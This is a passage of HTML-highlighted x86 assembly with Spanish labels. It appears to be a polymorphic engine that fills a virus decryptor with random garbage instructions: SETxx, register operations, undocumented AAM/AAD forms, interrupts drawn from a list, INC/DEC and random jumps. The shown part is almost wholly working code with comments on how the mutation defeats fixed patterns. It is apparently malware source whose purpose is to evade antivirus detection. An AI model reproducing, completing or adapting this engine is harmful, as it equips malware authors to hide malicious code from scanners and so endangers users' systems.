        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get an aleatory in AX</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Bytett</span><span class="sc0">        </span><span class="sc1">; ...jump and insert a byte</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Insert a word</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
   </span><span class="sc5">@@Bytett</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Insert a byte</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; return</span><span class="sc0">
</span><span class="sc1">;; Weird instruction ("SETxx")</span><span class="sc0">
</span><span class="sc5">@@InstruccionChunga</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">       </span><span class="sc1">; Extended opcode</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">       </span><span class="sc1">; Get random ?H or ?L register</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random word</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Set register operation on</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">      </span><span class="sc1">; Get a random bit field on bits 3,4,5</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Put register</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">       </span><span class="sc1">; Get a random SETxx operation</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">;; Usual register operation (ADD/OR/ADC... Register, Random Value)</span><span class="sc0">
</span><span class="sc5">@@OtroTipo</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0"> </span><span class="sc1">; Eliminate 32 bit opcode (due</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@CJJJDC</span><span class="sc0">       </span><span class="sc1">; to some problems)</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
  </span><span class="sc5">@@CJJJDC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">        </span><span class="sc1">; Put random AH in BL</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtroTipoWORD</span><span class="sc0">  </span><span class="sc1">; Jump if Zero Flag (to do 16 bits)</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">        </span><span class="sc1">; Get random ?H/?L in CL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; BL = 0 or 2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">        </span><span class="sc1">; Store opcode 80h or 82h (8 bits)</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Random word in AX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Set register operation on</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">      </span><span class="sc1">; Get a random operation (ADD/OR/ADC...)</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Put register</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store opcode + random byte</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">@@OtroTipoWORD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">       </span><span class="sc1">; 16 bits opcode</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Put it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">       </span><span class="sc1">; Get a random register</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ObtenRegistro</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Set register operation on</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc0">      </span><span class="sc1">; Get a random operation</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">        </span><span class="sc1">; Mix to get the operation</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Store a random word</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">;; 2 byte instructions</span><span class="sc0">
</span><span class="sc5">@@Instruccion2bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKDLL2</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKDLL2</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKDLL2</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">MeteEscritura</span><span class="sc0"> </span><span class="sc1">; Memory write with 1/8 of probability</span><span class="sc0">
   </span><span class="sc5">@@KKDLL2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">       </span><span class="sc1">; Zero flag with 1/8 of probability</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@HazInt</span><span class="sc0">        </span><span class="sc1">; Put interrupt if Zero Flag</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get random value</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Check if register to use is AX</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salxto02</span><span class="sc0">      </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Zero Flag with 25% of probability</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@InstrucConAX</span><span class="sc0">  </span><span class="sc1">; If Zero Flag, put an implicit AX inst.</span><span class="sc0">
   </span><span class="sc5">@@Salxto02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Save random byte in BL</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Get random instruction</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Will it be "CMP"?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@CDVDC</span><span class="sc0">         </span><span class="sc1">; If not, continue</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">       </span><span class="sc1">; Inverse source and destiny randomly</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Do a "CMP" instruction</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@CDVDC2</span><span class="sc0">        </span><span class="sc1">; Continue</span><span class="sc0">
     </span><span class="sc5">@@CDVDC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">        </span><span class="sc1">; Register is destiny</span><span class="sc0">
     </span><span class="sc5">@@CDVDC2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">       </span><span class="sc1">; Get a random source</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">        </span><span class="sc1">; DL = 0 (it is used like flag to know if</span><span class="sc0">
                      </span><span class="sc1">; a word must be added to instruction)</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">        </span><span class="sc1">;If Zero Flag, source is a memory address</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salxto03</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Put register operation</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Save AX in DX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Put in DX and restore AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">        </span><span class="sc1">; Get 0 or 1 in DL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">        </span><span class="sc1">; Construct 8 or 16 bits operation</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">        </span><span class="sc1">; Set DL to "instruction as-is"</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salxto08</span><span class="sc0">      </span><span class="sc1">; Continue here</span><span class="sc0">
   </span><span class="sc1">; Here to put "Operation   Register,Memory"</span><span class="sc0">
   </span><span class="sc5">@@Salxto03</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">       </span><span class="sc1">; Direct memory address?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salxto04</span><span class="sc0">      </span><span class="sc1">; If not, continue</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">        </span><span class="sc1">; Set "add random word to instruction" on</span><span class="sc0">
   </span><span class="sc5">@@Salxto04</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">        </span><span class="sc1">; Get an aleatory ?H or ?L</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">        </span><span class="sc1">; Convert register</span><span class="sc0">
   </span><span class="sc5">@@Salxto08</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; Mix it with the opcode</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">        </span><span class="sc1">; Have I to add a random word?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salxto05</span><span class="sc0">      </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store opcode</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
   </span><span class="sc5">@@Salxto05</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store opcode/random word</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">;; Implicit AX instruction</span><span class="sc0">
</span><span class="sc5">@@InstrucConAX</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; Aleatory Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KK01</span><span class="sc0">          </span><span class="sc1">; If Zero Flag, jump</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">       </span><span class="sc1">; AL=0 or 1</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D4h</span><span class="sc0">      </span><span class="sc1">; Get AAM or AAD</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store it with a random conversion base</span><span class="sc0">
                      </span><span class="sc1">; (it's undocumented, but it works)</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
       </span><span class="sc5">@@KK01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Get a random operation</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">       </span><span class="sc1">; Get AL operation</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store it with a random source byte</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">;; To do a random int (well, not absolutely random. They are selected from a</span><span class="sc0">
</span><span class="sc1">;; little list).</span><span class="sc0">
</span><span class="sc5">@@HazInt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">OpcodesInterrup</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Direction of usable</span><span class="sc0">
                              </span><span class="sc1">; interrupts</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">       </span><span class="sc1">; Get a number between 0 and 3</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">              </span><span class="sc1">; Get in AL the interrupt number</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0"> </span><span class="sc1">; Eliminate 32 bit opcode, if it</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salxto06</span><span class="sc0">          </span><span class="sc1">; was put before</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
  </span><span class="sc5">@@Salxto06</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Construct an "INT XXh" instruction</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">;;; 1 byte instruction</span><span class="sc0">
</span><span class="sc5">@@Instruccion1byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0"> </span><span class="sc1">; If 32 bit opcode, eliminate it</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@DHHDS</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
       </span><span class="sc5">@@DHHDS</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random word</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Zero Flag with 25% of probability</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@INCDEC</span><span class="sc0">        </span><span class="sc1">; If Zero Flag, jump here</span><span class="sc0">
</span><span class="sc5">@@DeTodo</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">       </span><span class="sc1">; Number of garbage one-byte instructions</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Are we going to use AX for garbage?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salxto01</span><span class="sc0">      </span><span class="sc1">; If not, avoid next instruction</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">       </span><span class="sc1">; Add quantity of one-byte instruction</span><span class="sc0">
                      </span><span class="sc1">; that use AX</span><span class="sc0">
   </span><span class="sc5">@@Salxto01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007Fh</span><span class="sc0">     </span><span class="sc1">; Get a random number between 0 and 7Fh</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc0">        </span><span class="sc1">; Get a random number between 0 and BH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">        </span><span class="sc1">; Put it on AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">BasuraNoBanderas</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Get the random</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">                       </span><span class="sc1">; instruction</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">;; Construct a INC or a DEC instruction</span><span class="sc0">
</span><span class="sc5">@@INCDEC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">       </span><span class="sc1">; Get random 0 or 8</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Set register</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; Convert to INC/DEC</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
    </span><span class="sc5">@@Salir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">;; Construct a JMP (non-zero displacement random unconditional jump with gar-</span><span class="sc0">
</span><span class="sc1">;; bage) or a CALL routine.</span><span class="sc0">
</span><span class="sc5">@@SaltoAleatorio</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PrimerByte</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; If first instruction</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salir</span><span class="sc0">                </span><span class="sc1">; on the decryptor, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EstoyDentro</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0"> </span><span class="sc1">; If it is inside ano-</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salir</span><span class="sc0">               </span><span class="sc1">; ther CALL, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EstoyDentro</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0"> </span><span class="sc1">; Put "I'm inside" flag</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">            </span><span class="sc1">; Get a random 0 or 2 in AL</span><span class="sc0">
